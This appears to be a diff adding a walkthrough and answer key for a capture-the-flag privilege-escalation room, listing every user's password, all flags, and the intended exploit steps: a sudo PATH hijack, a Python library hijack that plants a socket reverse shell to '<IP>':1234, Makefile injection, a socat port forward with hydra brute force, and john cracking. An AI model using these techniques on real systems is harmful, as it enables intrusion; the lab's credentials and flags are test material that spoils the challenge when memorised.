@@ -1,0 +1,132 @@
+Priv Esc Room
+
+Priv Esc Medium:
+    Creds:
+        user0:password
+        user1:Alw@y$_g0lD_M3d@l
+        user2:D@mN_S1lV3r_@ga1n
+        user2.5:@m_1_Tw0_0r_ThR3e?
+        user3:0n_tH3_P0d1uM
+        user4:4_1s_UnluCkY
+        user5:d0_1_3v3n_Ex1$t?
+        root:Wh0'$_th3_B0s$?
+        ftp:D15c0'#'
+    user1:
+        Rabbit hole: cron tar wildcard injection
+            Folder files has immutable attribute
+        Intended path: sudo
+            user0   ALL=(user1:user1) NOPASSWD: /usr/local/bin/echo
+            /usr/local/bin/ perm = 777
+            secure_path=/usr/local/bin:...:/bin
+            Exploit cmd:
+                rm /usr/local/bin/echo
+                cp /bin/bash /usr/local/bin/echo
+                sudo -u user1 /usr/local/bin/echo
+        Flag:
+            THM{R1$ky_F0lD3r$_P3rMs}
+    user2:
+        Rabbit hole:
+            file alice.jpg in /home/user2
+            stegcracker with rockyou.txt on it:
+                passwd= wonderland
+                alice.jpg.out contains:
+                    Rabbit Hole def from urban dictionary
+        Intended path: Python library highjacking
+            File: hangman.py in /home/user2/Project
+                => Sudo & import base64 library
+                => base64 perm = 777
+                edit base64 library and put a shell for instance in base64.encode:
+                    pentestmonkey ones are fine:
+                        locate base64.py
+                        nano /usr/lib/python3.6/base64.py
+                            => "import socket,subprocess,os" on the top of the file
+                            => "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+                                s.connect(("<IP>",1234))
+                                os.dup2(s.fileno(),0)
+                                os.dup2(s.fileno(),1)
+                                os.dup2(s.fileno(),2)
+                                p=subprocess.call(["/bin/bash","-i"])" in b64decode function
+                            => nc -lvnp 1234
+        Flag:
+            THM{PytH0n_H1ghJ@Cking}
+    user3:
+        Rabbit hole: sudo user2.5
+            sudoers: ALL=(user2.5:user2.5) NOPASSWD: /usr/bin/make
+            This user has no way to priv esc afterwards
+        Intended path: Makefile /home/user3/Shared_Project/
+            perm = 664
+            ownership = user3:user2
+            attribute = append-only
+            sudoers: ALL=(user3:user3) NOPASSWD: /usr/bin/make -f /home/user3/Shared_Project/Makefile
+            Exploit:
+                Create a file with appropriate format:
+                    "   /bin/bash"
+                    cat <file> >> /home/user3/Shared_Project/Makefile
+                    cd /home/user3/Shared_Project
+                    sudo -u user3 /usr/bin/make -f /home/user3/Shared_Project/Makefile re
+        Flag:
+            THM{M@k3f1L3$_@r3_U$3FuLl}
+    user4:
+        Rabbit hole:
+            /home/user3/responsability.txt
+            /home/user4/spider.c
+            /home/user4/spider
+            user4 crontab: /bin/cat /home/user3/responsability.txt | /home/user4/spider
+        Intended path: RE /usr/local/games/enigma_bis
+            sudo: ALL=(user4:user4) NOPASSWD: /usr/local/games/enigma_bis
+        How it works:
+            random 10 capital characters string generated
+            program displays the string
+            program asks for the answer
+            answer is:
+                When char lower than 'N'
+                    corresponding char in answer = lower char + 5
+                        ex: 'A' gives 'f'
+                When char greater or equal 'N'
+                    Corresponding char in answer = '0'
+                Example when program launched:
+                    Let's play a game !
+                    I say: XIWSLNCBPU
+                    What do you think ?
+                    Answer: 0n00q0hg00
+        Flag:
+            THM{3@sY_R3v3R$e_3nG1n33r1nG}
+    root:
+        Rabbit hole: Local http, port 80
+            curl or wget localhost
+            Port forwarding required for enumeration but nothing to find
+        Rabbit hole 2:
+            sudo: ALL=(user5:user5) NOPASSWD: /usr/local/games/enigma_third
+                Same as enigma_bis but:
+                    When char lower than 'N'
+                        corresponding char in answer = lower char + 2
+                    When char greater or equal 'N'
+                        Corresponding char in answer = 'z'
+        Intended path: Local FTP, port 12000
+            netstat -plunt
+            /etc/vsftpd.conf + /etc/vsftpd/user_list
+                => ftp open locally, port 12000
+                => Only ftp user can login
+            Port forward brute force: with /home/user4/music.txt
+                socat installed
+                Cmd local:
+                    socat TCP-LISTEN:1234,fork,reuseaddr TCP:localhost:12000
+                Cmd attacker:
+                    hydra -l ftp -P music.txt ftp://<IP>:1234/
+                    ftp passwd: D15c0'#' (3682 in music.txt)
+                Cmd local:
+                    ftp localhost 12000 OR su ftp and dir /var/backups
+                        Gives ftp Creds
+                    Extract: ftp_backup.tar.gz
+                        tar -xvf ftp_backup.tar.gz
+                            => user.txt + list.txt
+            John the ripper
+                john --wordlist=list.txt user.txt
+            su root
+        Note:
+            SSH login: Disabled for root + ftp
+        Possibility:
+            Write a script locally to brute force:
+                su ftp and/or su root
+        Flag:
+            THM{C0ngr@ts!!_Re@dY_f0R_tH3_Th1rD_Ep1s0d3?}
